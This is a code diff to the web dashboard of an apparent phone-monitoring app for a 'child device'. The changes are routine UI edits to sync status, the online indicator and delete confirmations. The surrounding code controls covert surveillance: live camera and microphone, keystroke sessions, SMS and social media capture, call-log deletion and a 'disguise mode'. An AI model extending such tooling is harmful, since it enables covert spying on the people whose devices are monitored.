@@ -778,6 +778,10 @@ function setupEventListeners() {
     item.addEventListener('click', () => {
       const page = item.dataset.page;
       navigateTo(page);
+      // Close sidebar on mobile when nav item clicked
+      if (window.innerWidth <= 768) {
+        sidebar.classList.remove('open');
+      }
     });
   });
   
@@ -787,6 +791,10 @@ function setupEventListeners() {
       e.preventDefault();
       const page = link.dataset.page;
       navigateTo(page);
+      // Close sidebar on mobile
+      if (window.innerWidth <= 768) {
+        sidebar.classList.remove('open');
+      }
     });
   });
   
@@ -836,7 +844,7 @@ function setupEventListeners() {
   document.getElementById('btnCamera')?.addEventListener('click', () => startWebRTCStream('camera'));
   document.getElementById('btnLiveListen')?.addEventListener('click', () => startWebRTCStream('audio'));
   document.getElementById('btnViewLocation')?.addEventListener('click', () => navigateTo('location'));
-  document.getElementById('btnOpenApp')?.addEventListener('click', () => sendCommand('open_app'));
+  document.getElementById('btnOpenApp')?.addEventListener('click', () => sendCommand('show_app'));
   document.getElementById('btnDeleteCallLogs')?.addEventListener('click', deleteCallLogs);
   document.getElementById('btnLockDevice')?.addEventListener('click', () => sendCommand('lock_device'));
   document.getElementById('btnRingDevice')?.addEventListener('click', ringDevice);
@@ -907,20 +915,6 @@ function setupEventListeners() {
   // Sync status banner buttons
   document.getElementById('btnSyncAllNow')?.addEventListener('click', syncNow);
   document.getElementById('btnViewSyncLogs')?.addEventListener('click', () => showToast('Sync logs coming soon', 'info'));
-  
-  // Refresh permissions button
-  document.getElementById('btnRefreshPermissions')?.addEventListener('click', () => {
-    loadDashboard();
-    showToast('Permissions refreshed', 'success');
-  });
-  
-  // Quick insight cards - navigate to pages
-  document.querySelectorAll('.insight-card[data-page]').forEach(card => {
-    card.addEventListener('click', () => {
-      const page = card.dataset.page;
-      if (page) navigateTo(page);
-    });
-  });
   
   // Filter chips for notifications
   document.querySelectorAll('.chip[data-filter]').forEach(chip => {
@@ -1637,21 +1631,32 @@ async function loadDashboard() {
       lastSeenEl.innerHTML = `Last seen: ${formatTime(device.lastSeen)} <span id="connectionStatus" style="font-weight: bold; margin-left: 8px;"></span>`;
     }
     
-    // Update connection status based on data and online status
+    // Update connection status based on isOnline from API (real-time via WebSocket)
     const connStatus = document.getElementById('connectionStatus');
     if (connStatus) {
-      // Check if device was seen recently (within last 5 minutes)
-      const lastSeenTime = device.lastSeen ? new Date(device.lastSeen).getTime() : 0;
-      const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
-      const isRecentlySeen = lastSeenTime > fiveMinutesAgo;
-      
-      // If device was not seen recently, show Offline
-      if (!isRecentlySeen) {
+      // Primary indicator: isOnline from API (updated via WebSocket heartbeat)
+      // This shows immediately if device's internet is off (mobile data or wifi)
+      if (device.isOnline === false) {
         connStatus.textContent = '• Offline';
         connStatus.style.color = '#f44336';
-      } else {
+        // Show toast for offline device
+        showToast('📵 Device appears offline - Mobile data or WiFi may be off', 'warning', 4000);
+      } else if (device.isOnline === true) {
         connStatus.textContent = '• Online';
         connStatus.style.color = '#4CAF50';
+      } else {
+        // Fallback: Check if device was seen recently (within last 5 minutes)
+        const lastSeenTime = device.lastSeen ? new Date(device.lastSeen).getTime() : 0;
+        const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
+        const isRecentlySeen = lastSeenTime > fiveMinutesAgo;
+        
+        if (!isRecentlySeen) {
+          connStatus.textContent = '• Offline';
+          connStatus.style.color = '#f44336';
+        } else {
+          connStatus.textContent = '• Online';
+          connStatus.style.color = '#4CAF50';
+        }
       }
     }
     
@@ -1679,12 +1684,6 @@ async function loadDashboard() {
     
     // Update sync status banner dynamically
     updateSyncStatus(device);
-    
-    // Update permission health panel dynamically
-    updatePermissionHealth(device.permissions);
-    
-    // Update quick insights dynamically
-    updateQuickInsights();
     
     // Load recent notifications
     loadRecentNotifications();
@@ -1741,96 +1740,6 @@ function updateSyncStatus(device) {
     if (syncIconEl) {
       syncIconEl.className = 'fas fa-exclamation-circle sync-icon error';
     }
-  }
-}
-
-// Update permission health panel with device permissions
-function updatePermissionHealth(permissions) {
-  if (!permissions) permissions = {};
-  
-  const permissionItems = document.querySelectorAll('.permission-item[data-permission]');
-  
-  permissionItems.forEach(item => {
-    const permName = item.dataset.permission;
-    const statusIcon = item.querySelector('.status-icon');
-    
-    // Map permission names to device permission keys
-    const permMap = {
-      'location': permissions.location,
-      'storage': permissions.storage || permissions.readExternalStorage,
-      'notifications': permissions.notificationListener || permissions.notifications,
-      'camera': permissions.camera,
-      'microphone': permissions.microphone || permissions.recordAudio,
-      'contacts': permissions.contacts || permissions.readContacts
-    };
-    
-    const isGranted = permMap[permName];
-    
-    item.classList.remove('granted', 'denied', 'pending');
-    
-    if (isGranted === true) {
-      item.classList.add('granted');
-      if (statusIcon) {
-        statusIcon.className = 'fas fa-check-circle status-icon';
-      }
-    } else if (isGranted === false) {
-      item.classList.add('denied');
-      if (statusIcon) {
-        statusIcon.className = 'fas fa-times-circle status-icon';
-      }
-    } else {
-      item.classList.add('pending');
-      if (statusIcon) {
-        statusIcon.className = 'fas fa-question-circle status-icon';
-      }
-    }
-  });
-}
-
-// Update quick insights with real data
-async function updateQuickInsights() {
-  if (!selectedDevice) return;
-  
-  const deviceId = getDeviceId(selectedDevice);
-  
-  try {
-    // Get today's date range
-    const today = new Date();
-    const startOfDay = new Date(today.getFullYear(), today.getMonth(), today.getDate()).toISOString();
-    
-    // Fetch photo count for today
-    try {
-      const photoData = await api(`/devices/${deviceId}/photos?limit=1`);
-      document.getElementById('insightPhotos').textContent = photoData.total || 0;
-    } catch (e) {
-      document.getElementById('insightPhotos').textContent = '0';
-    }
-    
-    // Fetch call count for today
-    try {
-      const callData = await api(`/devices/${deviceId}/call-logs?limit=1`);
-      document.getElementById('insightCalls').textContent = callData.total || 0;
-    } catch (e) {
-      document.getElementById('insightCalls').textContent = '0';
-    }
-    
-    // Fetch notification count
-    try {
-      const notifData = await api(`/devices/${deviceId}/notifications?limit=1`);
-      document.getElementById('insightNotifs').textContent = notifData.total || 0;
-    } catch (e) {
-      document.getElementById('insightNotifs').textContent = '0';
-    }
-    
-    // Fetch location count (places visited)
-    try {
-      const locData = await api(`/devices/${deviceId}/location`);
-      document.getElementById('insightPlaces').textContent = locData.history ? locData.history.length : 0;
-    } catch (e) {
-      document.getElementById('insightPlaces').textContent = '0';
-    }
-  } catch (error) {
-    console.error('Failed to load insights:', error);
   }
 }
 
@@ -3292,6 +3201,12 @@ async function syncNow() {
     return;
   }
   
+  // Check if device is offline - show instant feedback
+  if (selectedDevice.isOnline === false) {
+    showToast('📵 Device is OFFLINE - Mobile data or WiFi appears to be off on the child device', 'error', 5000);
+    return;
+  }
+  
   try {
     // Show loading state
     const btn = document.getElementById('btnSyncNow');
@@ -3317,7 +3232,13 @@ async function syncNow() {
     const btn = document.getElementById('btnSyncNow');
     btn.innerHTML = '<i class="fas fa-sync"></i><span>Sync Now</span>';
     btn.disabled = false;
-    alert('Failed to sync: ' + error.message);
+    
+    // Check if error is due to device being offline
+    if (error.message && error.message.includes('offline')) {
+      showToast('📵 Device is OFFLINE - Cannot sync when device has no internet connection', 'error', 5000);
+    } else {
+      alert('Failed to sync: ' + error.message);
+    }
   }
 }
 
@@ -3552,7 +3473,16 @@ async function applyDisguiseMode() {
 async function removeDevice() {
   if (!selectedDevice) return;
   
-  if (!confirm('Are you sure you want to remove this device? All data will be deleted.')) {
+  // Show comprehensive warning about data deletion
+  const deviceName = selectedDevice.name || selectedDevice.deviceName || 'this device';
+  const warningMessage = `⚠️ IMPORTANT WARNING ⚠️\n\nUnpairing "${deviceName}" will PERMANENTLY DELETE all data collected from this device:\n\n• All photos synced\n• All call logs\n• All SMS messages\n• All notifications\n• All browser history\n• All keystroke sessions\n• All social media messages\n• All location history\n• All app usage data\n• All screenshots\n\nThis action CANNOT be undone!\n\nAre you sure you want to continue?`;
+  
+  if (!confirm(warningMessage)) {
+    return;
+  }
+  
+  // Double confirmation
+  if (!confirm('This is your FINAL confirmation.\n\nAll data from this device will be deleted permanently.\n\nProceed?')) {
     return;
   }
   
@@ -5325,17 +5255,23 @@ async function loadPermissions() {
     permissionElements.forEach(el => {
       const permName = el.dataset.permission;
       const statusEl = el.querySelector('.permission-status');
-      const isGranted = permissions[permName] === true;
+      // Handle both naming conventions: restrictionSettings (frontend) and restrictedSettings (backend)
+      let isGranted;
+      if (permName === 'restrictionSettings') {
+        isGranted = permissions['restrictedSettings'] === true || permissions['restrictionSettings'] === true;
+      } else {
+        isGranted = permissions[permName] === true;
+      }
       
       // Handle restrictionSettings - only available on Android 13+
       if (permName === 'restrictionSettings') {
         const androidVersion = parseInt(data.device.androidVersion) || 0;
         if (androidVersion < 13) {
           if (statusEl) {
-            statusEl.textContent = 'Not in device';
-            statusEl.className = 'permission-status not-available';
+            statusEl.textContent = 'Not Required';
+            statusEl.className = 'permission-status granted';
           }
-          el.classList.add('not-available');
+          el.classList.add('granted');
           const btn = el.querySelector('.btn-request-perm');
           if (btn) btn.style.display = 'none';
           return;
